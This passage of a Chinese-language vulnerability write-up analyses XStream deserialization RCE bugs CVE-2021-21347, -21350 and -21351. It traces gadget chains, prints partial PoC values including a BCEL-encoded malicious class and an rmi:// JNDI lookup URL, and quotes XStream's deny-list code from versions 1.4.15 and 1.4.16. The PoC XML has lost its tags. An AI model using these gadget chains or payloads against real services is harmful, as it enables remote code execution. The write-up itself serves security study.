            bar.setBlabla("hello");
            foo.setBar(bar);
            XStream xstream = new XStream();
            String xml = xstream.toXML(foo);
            System.out.println(xml);
        }
查看执行结果
当引用了自己的成员内部类时，XStream就会通过outer-class来进行标识。在回过去看poc就可以理解这里表示的意思是Key作为一个成员内部类被ProtectionDomain引用，但是在jdk1.8.131中ProtectionDomain$Key是一个静态内部类呀，静态内部类XStream序列化的时候是不会通过\标签进行标识的
介于之前菜的坑，我又将jdk版本更换到1.8.221版本此时再看ProtectionDomain$Key这个类，可以看到在1.8.221版本的jdk中，Key已经从静态内部来改成一个成员内部类了，此时在运行POC就不会报找不到outer-class的错误了。
当然既然在jdk1.8.131版本中Key时静态内部类，那我们也可以直接通过在POC中删除\这个标签来避免这个报错。
不过虽然时不报错了，但是我们还是没搞清楚这个outer-class究竟为什么会有这条属性，这里引用一篇文章[java非静态内部类中的属性this$0](https://blog.csdn.net/doctor_who2004/article/details/102329237)
接着用我们写的Demo中的Foo类和它的成员内部类Bar类来进行讲解，在Foo$Bar对象生成过后我打一个断点
这里有一个变量名为this$0的一个变量，仔细观察他的类型，发现是一个Foo类型的，也就是说他是Foo这个最外层的类对象，还记得学习java基础的时候在学习内部类的时候学过的一个知识点，就是内部类可以直接使用外部类的公有或私有变量，而外部类却不能直接使用内部类的变量，就是因为内部类会在编译时就加入一个外部类作为变量。
搞明白了这一点后我们就继续分析gadget
同样的PriorityQueue部分就不再重复讲解了，只贴一下调用链
我们从ObsevableList$1这个匿名内部类开始讲起，我们来看下这个匿名内部类的实现
这里 o1和o2是同一个Base64Data对象，目的调用Base64Data.toString方法，跟入查看toString方法详情
toString方法中调用了Base64Data.get方法，继续跟入，在get方法中调用了ByteArrayOutputStreamEx.readFrom()方法，而传入的参数则是一个SequenceInputStream对象。
这里先粘贴一下此时整个Base64Data对象的封装情况。
跟入ByteArrayOutputStreamEx.readFrom()方法，经过几次嵌套调用后，来到了SequenceInputStream.nextStream()方法中，这里的关键是调用了属性e，也就是POC中就封装进去的MultiUIDefaults$MultiUIDefaultsEnumerator对象的hasMoreElements()方法
继续跟进，就会看到调用了JavacProcessingEnvironment$NameProcessIterator.hasNext()方法
当跟入到hasNext()方法方法后可以看到该方法中的关键点在于，调用processorCL的loadClass方法
我们直接从POC中来查看processorCL就是封装进去的URLClassLoader对象，而var1就是封装入names属性中的Arrays$ArrayList对象中存储的字符串也就是恶意类的名字。
接下来的步骤就是通过URLClassloader去远程加载恶意类到本地
然后执行静态代码块中的恶意代码从而导致RCE，这个过程就不进行深入赘述了，至此CVE-2021-21347漏洞分析完毕
## 4\. CVE-2021-21350
粘贴一下POC
          2
        3
              text/plain
                      0
                      -1
                      0
                          $$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A
                        false
                        false
                      false
                        java.
                        javax.
                        sun.
                          .
                  KEYS
                  0
                  0
                  0
              false
          0
该漏洞的整个利用链和CVE-2021-21345如出一辙，不同的地方在于，最后的加载恶意Class的Classloader不再使用URLClassloader去远程加载，而是采用了com.sun.org.apache.bcel.internal.util.ClassLoader，这里相信对FastJson有了解的同学应该不陌生，这里使用了BCEL的方式来进行恶意代码执行
但是整个利用链和CVE-2021-21347是一样的，所以这里也就不重复赘述了。
## 5\. CVE-2021-21351
粘贴一下POC
        ysomap
              -10086
                false
                false
                false
              false
              false
                      1008
                      true
                      1000
                      0
                      2
                      0
                      0
                      0
                      true
                      1004
                      false
                      rmi://localhost:15000/CallRemoteMethod
                  com.sun.rowset.JdbcRowSetImpl
                  setAutoCommit
                    boolean
                false
                false
              false
              -1
              false
              false
            1
          1
          false
        ysomap
          test
这次用到的gadget入口点为javax.naming.ldap.Rdn$RdnEntry，在使用该POC之前仍然有一个点是需要注意的，\
这个标签在低版本的jdk中是没有的，需要进行更换。
更换成以下标签。
接下来就用jdk1.8.20为例，来进行分析。首先在POC中我们可以直观的看到，有两个Rdn$RdnEntry的序列化数据，最外层的触发点是Rdn$RdnEntry.compareTo方法，该方法是对比两个Rdn$RdnEntry的value属性是否相同。
当前对象的value属性是一个Xstring对象，在POC中的这个位置。
所以跟进Xstring.equals方法，该方法中需要注意的是调用了obj2 也就是传入的XRTreeFrag.toString方法，跟进该方法
经过一次嵌套调用后，来到XRTreeFrag.str方法中 这里调用了之前就封装在POC中的SAX2DTM对象，如下图所示
跟入SAX2DTM.getStringValue方法，经过两次嵌套调用后，来到了SAX2DTM.nextNode方法中，该方法中需要注意的是调用了m_incrementalSAXSource属性也就是POC中封装好的IncrementalSAXSource_Xerces对象的deliverMoreNodes方法。
继续向下执行，最终会执行到IncrementalSAXSource_Xerces.parseSome方法，该方法会通过反射调用JdbcRowSetImpl.setAutoCommit方法。
接下来的流程就还是JdbcRowSetImpl的老一套了，就不再深入说明了。至此CVE-2021-21351分析完毕
## 6\. 总结
此次爆出的几个反序列化RCE漏洞，总结下漏洞的触发点分别为“java.util.PriorityQueue.compare()“、“javax.naming.ldap.Rdn$RdnEntry.compareTo()”、而Xstream的防护方法也是很直白是通过黑名单的形式来进行防护。
下面是1.4.15版本的黑名单
    protected void setupSecurity() {
        if (securityMapper == null) {
            return;
        }
        addPermission(AnyTypePermission.ANY);
        denyTypes(new String[]{
            "java.beans.EventHandler", //
            "java.lang.ProcessBuilder", //
            "javax.imageio.ImageIO$ContainsFilter", //
            "jdk.nashorn.internal.objects.NativeString" });
        denyTypesByRegExp(new Pattern[]{LAZY_ITERATORS, JAVAX_CRYPTO, JAXWS_FILE_STREAM});
        allowTypeHierarchy(Exception.class);
        securityInitialized = false;
    }
然后是1.4.16版本的黑名单
      private static final String ANNOTATION_MAPPER_TYPE = "com.thoughtworks.xstream.mapper.AnnotationMapper";
        private static final Pattern IGNORE_ALL = Pattern.compile(".*");
        private static final Pattern GETTER_SETTER_REFLECTION = Pattern.compile(".*\\$GetterSetterReflection");
        private static final Pattern PRIVILEGED_GETTER = Pattern.compile(".*\\$PrivilegedGetter");
        private static final Pattern LAZY_ITERATORS = Pattern.compile(".*\\$LazyIterator");
        private static final Pattern JAXWS_ITERATORS = Pattern.compile(".*\\$ServiceNameIterator");
        private static final Pattern JAVAFX_OBSERVABLE_LIST__ = Pattern.compile("javafx\\.collections\\.ObservableList\\$.*");
        private static final Pattern JAVAX_CRYPTO = Pattern.compile("javax\\.crypto\\..*");
        private static final Pattern BCEL_CL = Pattern.compile(".*\\.bcel\\..*\\.util\\.ClassLoader");
    ......
    protected void setupSecurity() {
        if (this.securityMapper != null) {
            this.addPermission(AnyTypePermission.ANY);
            this.denyTypes(new String[]{"java.beans.EventHandler", "java.lang.ProcessBuilder", "javax.imageio.ImageIO$ContainsFilter", "jdk.nashorn.internal.objects.NativeString", "com.sun.corba.se.impl.activation.ServerTableEntry", "com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator", "sun.awt.datatransfer.DataTransferer$IndexOrderComparator", "sun.swing.SwingLazyValue"});
            this.denyTypesByRegExp(new Pattern[]{LAZY_ITERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVAX_CRYPTO, JAXWS_ITERATORS, JAVAFX_OBSERVABLE_LIST__, BCEL_CL});
            this.denyTypeHierarchy(InputStream.class);
            this.denyTypeHierarchyDynamically("java.nio.channels.Channel");
            this.denyTypeHierarchyDynamically("javax.activation.DataSource");
            this.denyTypeHierarchyDynamically("javax.sql.rowset.BaseRowSet");
            this.allowTypeHierarchy(Exception.class);
            this.securityInitialized = false;
        }
    }
* * *